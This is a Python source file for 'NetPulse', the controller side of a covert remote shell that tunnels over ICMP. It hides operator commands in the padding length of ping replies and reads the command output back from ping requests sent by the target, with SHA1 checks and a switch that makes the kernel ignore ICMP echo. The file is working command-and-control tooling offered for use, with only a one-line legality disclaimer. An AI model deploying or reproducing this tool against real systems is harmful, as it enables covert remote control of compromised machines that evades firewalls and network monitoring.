#!/usr/bin/env python3
import os
import sys
import socket
import hashlib
import argparse
import threading

from scapy.all import sniff, Packet, ICMP, Ether, IP, sendp
from typing import Any

shell          = "\033[1;92m%target ❯\033[0m  "

__version__    = "0.0.1"
payload        = [0]
args           = None
message        = ""
payload_index  = 0
listening      = False
sending        = False
establish      = False
event          = threading.Event()


def f_padding(padding: str, code: int) -> str:
    """
    Formata o padding usado nos pacotes ICMP.
    A função repete ou reduzi a string `padding` para ficar
    com a quantidade de caracteres exato de `code`.
    """
    if code >= len(padding):
        r_padding = padding * ((code // len(padding)) + 1)
        return r_padding[:code]
    else:
        return padding[:code]


def process_command(bytes: str) -> str:
    """
    Solicita o envio do comando e obtem a saída,
    além de fazer verificações de checksum.
    """
    global payload
    global payload_index
    global sending
    global listening
    global args
    global message
    global establish

    if len(bytes) == 0:
        return ""

    payload_index = 0

    if args.verification:
        hash_res = hashlib.sha1(bytes.encode(args.decode)).hexdigest()
    else:
        hash_res = "#" # "#" = WITHOUT CHECKSUM

    if not establish:
        payload = [0]
        establish = True
    else:
        payload = []

    bytes = f"{hash_res}:{bytes}"

    for byte in bytes:
        payload.append(ord(byte))

    payload.append(0)

    sending = True

    payload_len = len(payload)

    while sending or listening:
        try:
            if sending:
                p = (payload_index // payload_len) * 100

                if p == 0:
                    print("\r* Waiting for a target request...", end="")
                else:
                    print(
                        f"\r* Sending bytes to the target... ({payload_index}/{payload_len}) {p}%",
                        end="",
                    )
            else:
                print(
                    f"              \r* Receiving data from the target... {len(message)} bytes",
                    end="",
                )
        except KeyboardInterrupt:
            listening = False
            return message

    print(f"\r{' '*50}\r", end="")

    message = message.split(":")

    checksum = message[0]
    content = ":".join(message[1:])

    if args.verification and checksum != "#":
        content_hash = hashlib.sha1(content.encode(args.decode)).hexdigest()
        if content_hash != checksum:
            print(
                "\033[1;91m[NETPULSE MESSAGE] SHA1 checksum failed, indicating potential corruption in the command output.\033[0m",
                file=sys.stderr,
            )
    message = ""

    return content


def connection(packet: Packet) -> None:
    """
    Função chamada pela função `sniff` toda vez que
    um pacote ICMP echo request é enviado a máquina.
    """
    global payload_index
    global listening
    global event
    global message
    global args
    global payload
    global sending

    if (listening or sending) and (ICMP in packet) and (packet[ICMP].type == 8):
        id_ = packet[ICMP].id
        seq = packet[ICMP].seq

        if listening:
            try:
                message += packet[ICMP].load.decode(args.decode)
            except AttributeError:
                listening = False

            sendp(
                (
                    Ether(src=packet[Ether].dst, dst=packet[Ether].src)
                    / IP(src=packet[IP].dst, dst=packet[IP].src)
                    / ICMP(type=0, id=id_, seq=seq)
                ),
                count=1,
                iface=args.iface,
                verbose=False,
            )
            return

        code = payload[payload_index]

        echo_reply = (
            Ether(src=packet[Ether].dst, dst=packet[Ether].src)
            / IP(src=packet[IP].dst, dst=packet[IP].src)
            / ICMP(type=0, id=id_, seq=seq)
            / f_padding(args.padding, code)
        )

        sendp(echo_reply, count=1, iface=args.iface, verbose=False)

        if code == 0 and payload_index != 0:
            listening = True
            sending = False
            return

        payload_index += 1


def create_main_parser() -> argparse.ArgumentParser:
    """Cria um parser de argumentos padrão para o programa."""
    parser = argparse.ArgumentParser(
        prog="netpulse",
        add_help=False,
        usage="netpulse [options] <target>",
        description=f"""
_   _  _____ ___________ _   _ _      _____ _____  
| \ | ||  ___|_   _| ___ \ | | | |    /  ___|  ___|
|  \| || |__   | | | |_/ / | | | |    \ `--.| |__  
| . ` ||  __|  | | |  __/| | | | |     `--. \  __| 
| |\  || |___  | | | |   | |_| | |____/\__/ / |___ 
\_| \_/\____/  \_/ \_|    \___/\_____/\____/\____/ 
                                                   
NetPulse v{__version__} - github.com/thekh49s/netpulse
""",
        epilog="NetPulse is a script that allows you to establish a remote shell\non a target device using the ICMP protocol. Use it responsibly and\nwith proper permission, as misuse may be considered illegal.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    options = parser.add_argument_group()

    options.add_argument("-h", action="help", help="show this help message and exit")
    options.add_argument(
        "-v",
        action="version",
        version=f"NetPulse v{__version__} (Python {sys.version_info.major}.{sys.version_info.minor})",
        help="show version message and exit",
    )
    options.add_argument(
        "-p",
        dest="padding",
        metavar="<byte(s)>",
        help="padding byte in ICMP packets",
        default=".",
    )
    options.add_argument(
        "-i",
        dest="iface",
        metavar="<iface>",
        help="interface for monitoring",
    )
    options.add_argument(
        "-f",
        dest="filter",
        metavar="<filter>",
        help="rules for packet filtering",
        default="icmp and icmp[0] = 8",
    )
    options.add_argument(
        "-d",
        dest="decode",
        metavar="<decode>",
        help="decoding of received data",
        default="latin-1",
    )
    options.add_argument(
        "-n",
        dest="verification",
        action="store_false",
        help="do not perform integrity verification",
        default="latin-1",
    )
    options.add_argument(
        "-c",
        dest="command",
        metavar="<command>",
        help="execute <command> and exit the program. (DO NOT USE THIS OPTION TO ESTABLISH A CONNECTION)",
    )
    options.add_argument(
        "-s",
        dest="kernel_cfg",
        action="store_true",
        help="set/unset the kernel to ignore ICMP packets.",
    )

    parser.add_argument(
        "target",
        nargs="?",
        help=argparse.SUPPRESS,
    )

    return parser


def _sniff(event: threading.Event) -> None:
    """Responsavél por chamar a função `sniff` e tratar erros."""
    global args

    try:
        sniff(
            iface=args.iface,
            filter=args.filter,
            prn=connection,
            quiet=True,
            stop_filter=lambda x: event.is_set(),
        )
    except PermissionError:
        event.is_set()
        print("[ERROR] Insufficient permissions. Try as root!")
        return


def kernel_configure() -> int:
    """Set/Unset the kernel to ignore ICMP packets."""
    filenames = [
        "/proc/sys/net/ipv4/icmp_echo_ignore_all",
        "/proc/sys/net/ipv6/icmp/icmp6_echo_ignore_all",
    ]
    for filename in filenames:
        print(f"[-] Reading file {filename}...")
        try:
            with open(filename, "r") as fp:
                file_value = fp.read().strip()
                if file_value == "0":
                    print("[+] Setting file value to 1.")
                    with open(filename, "w") as fp:
                        fp.write("1")
                    print("[-] System will now ignore all ICMP packets from this configuration.")
                elif file_value == "1":
                    print("[+] Setting file value to 0.")
                    with open(filename, "w") as fp:
                        print("[-] System will stop ignoring all ICMP packets from this configuration.")
                        fp.write("0")
                else:
                    print(f"[!] Value of the file is unrecognizable: {file_value}")
        except FileNotFoundError:
            print("[!] File was not found.")
        except PermissionError:
            print("[!] Insufficient permissions.")
    return 0


def main() -> int:
    """Função principal do programa."""
    global establish
    global event
    global args
    global shell

    parser = create_main_parser()
    args = parser.parse_args()

    if args.kernel_cfg:
        return kernel_configure()

    if args.target is None:
        parser.print_usage()
        print(
            "netpulse: error: the following arguments are required: target",
            file=sys.stderr,
        )
        return 1

    try:
        target = socket.gethostbyname(args.target)
    except socket.gaierror:
        print(f"[ERROR] Please verify that the target ({args.target}) is correct.")
        return 1

    sniff_thread = threading.Thread(target=_sniff, args=(event,))

    sniff_thread.start()

    if args.command is not None:
        establish = True
        print(process_command(args.command))

        event.set()
        return 0

    while True:
        try:
            output = process_command(input(shell.replace("%target", args.target)))

            if len(output):
                print(output)

        except KeyboardInterrupt:
            print("\n\033[1;93mQuitting...\033[0m")
            event.set()

            return 0


if __name__ == "__main__":
    sys.exit(main())
